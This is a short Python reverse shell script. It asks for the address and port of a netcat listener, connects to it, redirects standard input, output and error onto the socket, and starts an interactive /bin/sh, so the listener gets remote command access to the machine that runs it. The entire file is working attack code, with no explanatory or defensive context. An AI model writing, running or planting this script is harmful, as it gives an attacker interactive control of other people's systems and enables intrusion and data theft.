import socket,subprocess,os


ip_nc = input("Ip address where netcat are listening: ")
port_nc = int(input("Port number where netcat are listening: "))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip_nc,port_nc))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
